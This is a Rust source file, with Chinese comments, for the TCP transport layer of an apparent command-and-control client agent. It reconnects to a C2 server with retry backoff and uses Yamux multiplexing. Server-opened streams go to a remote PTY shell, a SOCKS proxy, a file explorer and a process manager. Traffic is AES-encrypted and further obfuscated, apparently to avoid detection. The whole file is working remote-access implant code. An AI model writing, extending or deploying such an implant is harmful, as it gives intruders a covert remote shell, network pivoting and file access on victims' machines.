// TCP 传输层实现
//
// 提供基于原始 TCP 套接字的传输层实现，使用 Yamux 多路复用。
// 使用简单的长度前缀协议进行消息分帧。

use crate::backoff::ExponentialBackoff;
use crate::config::get_aes_key;
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::Transport;
use async_trait::async_trait;
use log::{debug, error, info, warn};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::sleep;
use tokio_util::compat::{FuturesAsyncReadCompatExt, TokioAsyncReadCompatExt};
use yamux::{Config, Connection, Mode, WindowUpdateMode};

/// TCP 传输实现
/// 
/// 使用 Yamux 多路复用的 TCP 套接字进行通信，消息格式：
/// - 4 字节长度前缀（大端序）
/// - N 字节消息内容
pub struct TcpTransport {
    /// 服务器 URL (格式: tcp://host:port)
    url: String,
    
    /// Yamux 控制流（用于 C2 命令）
    control_stream: Option<tokio_util::compat::Compat<yamux::Stream>>,

    /// AES-256 加密密钥
    aes_key: Vec<u8>,
    
    /// 指数退避策略
    backoff: ExponentialBackoff,
}

impl TcpTransport {
    /// 创建新的 TCP 传输实例
    /// 
    /// # 参数
    /// 
    /// * `url` - 服务器 URL，格式：tcp://host:port
    /// 
    /// # 示例
    /// 
    /// ```
    /// use c2_client_agent::transport::TcpTransport;
    /// 
    /// let transport = TcpTransport::new("tcp://127.0.0.1:8080".to_string());
    /// ```
    pub fn new(url: String) -> Self {
        let aes_key = get_aes_key();
        debug!("AES key loaded: {} bytes", aes_key.len());
        Self {
            url,
            control_stream: None,
            aes_key,
            backoff: ExponentialBackoff::default(),
        }
    }
    
    /// 解析 URL 获取主机和端口
    /// 
    /// # 返回值
    /// 
    /// 返回 (host, port) 元组
    fn parse_url(&self) -> Result<(String, u16)> {
        // 先确保有协议头，如果没有则补上以便后续统一处理
        let full_url = if !self.url.contains("://") {
            format!("tcp://{}", self.url)
        } else {
            self.url.clone()
        };

        // 提取协议后的内容 (e.g., tcp://127.0.0.1:8080/path -> 127.0.0.1:8080/path)
        let rest = full_url.split("://").nth(1).ok_or_else(|| {
            ClientError::ConnectionError(format!("Invalid URL format: {}", self.url))
        })?;

        // 移除路径部分 (e.g., 127.0.0.1:8080/ws -> 127.0.0.1:8080)
        let addr = rest.split('/').next().unwrap_or(rest);
        
        // 分割主机和端口
        let parts: Vec<&str> = addr.split(':').collect();
        if parts.len() != 2 {
            return Err(ClientError::ConnectionError(
                format!("Invalid TCP address format, expected host:port: {}", addr)
            ));
        }
        
        let host = parts[0].to_string();
        let port = parts[1].parse::<u16>()
            .map_err(|e| ClientError::ConnectionError(
                format!("Invalid port number in {}: {}", addr, e)
            ))?;
        
        Ok((host, port))
    }
}

#[async_trait]
impl Transport for TcpTransport {
    async fn connect(&mut self) -> Result<()> {
        let (host, port) = self.parse_url()?;
        let addr = format!("{}:{}", host, port);
        
        loop {
            info!("Attempting TCP connection to {}...", addr);
            
            match TcpStream::connect(&addr).await {
                Ok(stream) => {
                    info!("TCP connection established to {}", addr);
                    
                    // Setup Yamux multiplexing
                    let mut yamux_config = Config::default();
                    yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
                    
                    // Wrap TCP stream with compatibility layer for Yamux
                    let compat_stream = stream.compat();
                    
                    // Create Yamux connection in Client mode
                    let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
                    println!("[*] Yamux Session created.");
                    let mut control = connection.control();

                    // Open the control stream (first stream for C2 commands)
                    // Spawn the Yamux connection driver in background (must run before open_stream resolves)
                    tokio::spawn(async move {
                        loop {
                            match connection.next_stream().await {
                                Ok(Some(stream)) => {
                                    info!("[+] Server initiated a new Yamux stream");
                                    // 协议调度器：读取第一个字节确定流类型
                                    tokio::spawn(async move {
                                        use futures_util::AsyncReadExt;
                                        let mut stream = stream;
                                        let mut type_buf = [0u8; 1];

                                        if let Err(e) = stream.read_exact(&mut type_buf).await {
                                            error!("Failed to read stream type byte: {}", e);
                                            return;
                                        }

                                        // 根据类型字节分发到对应处理器
                                        match type_buf[0] {
                                            0x01 => {
                                                info!("[*] Stream Type 0x01: PTY Session");
                                                crate::pty::handle_stream(stream).await;
                                            }
                                            0x02 => {
                                                info!("[*] Stream Type 0x02: SOCKS Proxy");
                                                crate::socks::handle_stream(stream).await;
                                            }
                                            0x03 => {
                                                info!("[*] Stream Type 0x03: File Explorer");
                                                crate::fs::handle_stream(stream).await;
                                            }
                                            0x04 => {
                                                info!("[*] Stream Type 0x04: Process Manager");
                                                crate::process::handle_stream(stream).await;
                                            }
                                            _ => {
                                                warn!("[!] Unknown stream type: 0x{:02X}", type_buf[0]);
                                            }
                                        }
                                    });
                                }
                                Ok(None) => {
                                    debug!("Yamux connection closed");
                                    break;
                                }
                                Err(e) => {
                                    warn!("Yamux connection error: {}", e);
                                    break;
                                }
                            }
                        }
                        debug!("Yamux connection driver terminated");
                    });

                    let control_stream = match control.open_stream().await {
                        Ok(s) => {
                            println!("[+] Control Stream Opened. Sending registration...");
                            s
                        }
                        Err(e) => {
                            return Err(ClientError::ConnectionError(
                                format!("Failed to open Yamux control stream: {}", e)
                            ));
                        }
                    };
                    
                    info!("Yamux control stream opened");
                    
                    self.control_stream = Some(control_stream.compat());
                    self.backoff.reset();
                    return Ok(());
                }
                Err(e) => {
                    let delay = self.backoff.next_delay();
                    error!(
                        "Failed to connect to {}: {}. Retrying in {:?}...",
                        addr, e, delay
                    );
                    sleep(delay).await;
                }
            }
        }
    }
    
    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let stream = self.control_stream.as_mut()
            .ok_or_else(|| ClientError::ConnectionError(
                "Not connected".to_string()
            ))?;
        
        // TCP 模式也进行 AES-256-GCM 加密，保持与服务端一致
        let encrypted = crypto::encrypt(data, &self.aes_key);
        
        // 报文混淆 (二次加重)
        let obfuscated = crypto::obfuscate_packet(encrypted);

        // 发送长度前缀（4 字节大端序）
        let len = obfuscated.len() as u32;
        stream.write_u32(len).await
            .map_err(|e| ClientError::ConnectionError(
                format!("Failed to write length prefix: {}", e)
            ))?;
        
        // 发送加密且混淆后的消息内容
        stream.write_all(&obfuscated).await
            .map_err(|e| ClientError::ConnectionError(
                format!("Failed to write data: {}", e)
            ))?;
        
        // 刷新缓冲区
        stream.flush().await
            .map_err(|e| ClientError::ConnectionError(
                format!("Failed to flush stream: {}", e)
            ))?;
        
        debug!("Sent {} bytes (obfuscated) via Yamux control stream", obfuscated.len());
        Ok(())
    }
    
    async fn receive(&mut self) -> Result<Vec<u8>> {
        let stream = self.control_stream.as_mut()
            .ok_or_else(|| ClientError::ConnectionError(
                "Not connected".to_string()
            ))?;
        
        // 读取长度前缀（4 字节大端序）
        let len = stream.read_u32().await
            .map_err(|e| {
                if e.kind() == std::io::ErrorKind::UnexpectedEof {
                    warn!("Yamux control stream closed by server");
                    ClientError::ConnectionError("Connection closed".to_string())
                } else {
                    ClientError::ConnectionError(
                        format!("Failed to read length prefix: {}", e)
                    )
                }
            })? as usize;
        
        // 验证长度合理性（防止恶意超大消息）
        if len > 100 * 1024 * 1024 {  // 100MB 限制
            return Err(ClientError::ConnectionError(
                format!("Message too large: {} bytes", len)
            ));
        }
        
        // 读取消息内容
        let mut buffer = vec![0u8; len];
        stream.read_exact(&mut buffer).await
            .map_err(|e| ClientError::ConnectionError(
                format!("Failed to read data: {}", e)
            ))?;
        
        // 报文解混淆
        let deobfuscated = crypto::deobfuscate_packet(buffer);
        
        // 解密服务端数据（AES-256-GCM）
        let plaintext = crypto::decrypt(&deobfuscated, &self.aes_key)
            .map_err(|e| ClientError::ConnectionError(format!("Decryption error: {}", e)))?;

        debug!("Received {} bytes via Yamux control stream", plaintext.len());
        Ok(plaintext)
    }
    
    fn is_connected(&self) -> bool {
        self.control_stream.is_some()
    }
    
    fn initialize(&mut self, _client_uuid: &str) {
        // TCP 不需要特殊初始化
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tcp_transport_creation() {
        let transport = TcpTransport::new("tcp://127.0.0.1:8080".to_string());
        assert!(!transport.is_connected());
    }

    #[test]
    fn test_parse_url_valid() {
        let transport = TcpTransport::new("tcp://127.0.0.1:8080".to_string());
        let result = transport.parse_url();
        assert!(result.is_ok());
        
        let (host, port) = result.unwrap();
        assert_eq!(host, "127.0.0.1");
        assert_eq!(port, 8080);
    }

    #[test]
    fn test_parse_url_with_hostname() {
        let transport = TcpTransport::new("tcp://example.com:9999".to_string());
        let result = transport.parse_url();
        assert!(result.is_ok());
        
        let (host, port) = result.unwrap();
        assert_eq!(host, "example.com");
        assert_eq!(port, 9999);
    }

    #[test]
    fn test_parse_url_invalid_format() {
        let transport = TcpTransport::new("tcp://invalid".to_string());
        let result = transport.parse_url();
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_url_invalid_port() {
        let transport = TcpTransport::new("tcp://127.0.0.1:invalid".to_string());
        let result = transport.parse_url();
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_url_missing_prefix() {
        let transport = TcpTransport::new("127.0.0.1:8080".to_string());
        let result = transport.parse_url();
        assert!(result.is_ok()); // Should be OK now because we prepend tcp://
    }

    #[test]
    fn test_not_connected_initially() {
        let transport = TcpTransport::new("tcp://127.0.0.1:8080".to_string());
        assert!(!transport.is_connected());
    }
}
